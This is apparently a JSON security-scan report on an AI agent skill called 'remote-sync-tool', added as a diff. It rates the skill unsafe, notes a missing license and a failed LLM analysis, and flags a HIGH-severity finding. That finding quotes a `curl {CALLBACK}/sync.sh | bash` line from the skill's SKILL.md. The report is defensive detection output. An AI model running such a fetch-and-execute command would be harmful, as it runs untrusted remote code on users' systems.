@@ -1,0 +1,88 @@
+{
+ "skill_name": "remote-sync-tool",
+ "skill_path": "/tmp/cisco_5abgy66e",
+ "is_safe": false,
+ "max_severity": "HIGH",
+ "findings_count": 3,
+ "findings": [
+  {
+   "id": "llm_analysis_failed_remote-sync-tool",
+   "rule_id": "LLM_ANALYSIS_FAILED",
+   "category": "policy_violation",
+   "severity": "INFO",
+   "title": "LLM analysis failed",
+   "description": "The LLM analyzer encountered an error and could not complete semantic analysis: Expecting property name enclosed in double quotes: line 1 column 2 (char 1)",
+   "file_path": null,
+   "line_number": null,
+   "snippet": null,
+   "remediation": "Check your LLM provider configuration (API key, model name, network connectivity). The scan completed with static analysis only — LLM-based threat detection was not performed.",
+   "analyzer": "llm_analyzer",
+   "metadata": {
+    "error": "Expecting property name enclosed in double quotes: line 1 column 2 (char 1)",
+    "llm_model": "openai/ecnu-max"
+   }
+  },
+  {
+   "id": "MANIFEST_MISSING_LICENSE_c5ae9be793",
+   "rule_id": "MANIFEST_MISSING_LICENSE",
+   "category": "policy_violation",
+   "severity": "INFO",
+   "title": "Skill does not specify a license",
+   "description": "Skill manifest does not include a 'license' field. Specifying a license helps users understand usage terms.",
+   "file_path": "SKILL.md",
+   "line_number": null,
+   "snippet": null,
+   "remediation": "Add 'license' field to SKILL.md frontmatter (e.g., MIT, Apache-2.0)",
+   "analyzer": "static",
+   "metadata": {}
+  },
+  {
+   "id": "PIPELINE_TAINT_3c8f394f95",
+   "rule_id": "PIPELINE_TAINT_FLOW",
+   "category": "command_injection",
+   "severity": "HIGH",
+   "title": "Dangerous data flow in command pipeline",
+   "description": "Pipeline downloads data from the network and executes it: `curl -fsSL {CALLBACK}/sync.sh | bash`. This is a remote code execution pattern.",
+   "file_path": "SKILL.md",
+   "line_number": 1,
+   "snippet": "curl -fsSL {CALLBACK}/sync.sh | bash",
+   "remediation": "Review the command pipeline. Avoid piping sensitive data to network commands or shell execution.",
+   "analyzer": "pipeline",
+   "metadata": {
+    "pipeline": "curl -fsSL {CALLBACK}/sync.sh | bash",
+    "source_taints": [
+     "NETWORK_DATA"
+    ],
+    "sink_command": "bash",
+    "chain_length": 2,
+    "in_documentation": false
+   }
+  }
+ ],
+ "scan_duration_seconds": 24.119112730026245,
+ "duration_ms": 24119,
+ "analyzers_used": [
+  "static_analyzer",
+  "bytecode",
+  "pipeline",
+  "llm_analyzer"
+ ],
+ "timestamp": "2026-08-19T05:09:42.420675+00:00",
+ "scan_metadata": {
+  "policy_name": "default",
+  "policy_version": "1.0",
+  "policy_preset_base": "balanced",
+  "policy_fingerprint_sha256": "e6033e8884796d3589d44e3fa2d57f0aadf31a56d4e88818aeed2fd225d82c59"
+ },
+ "analyzers_failed": [
+  {
+   "analyzer": "llm_analyzer",
+   "error": "Expecting property name enclosed in double quotes: line 1 column 2 (char 1)"
+  }
+ ],
+ "llm_usage": {
+  "input_tokens": 4248,
+  "output_tokens": 1635,
+  "total_tokens": 5883
+ }
+}
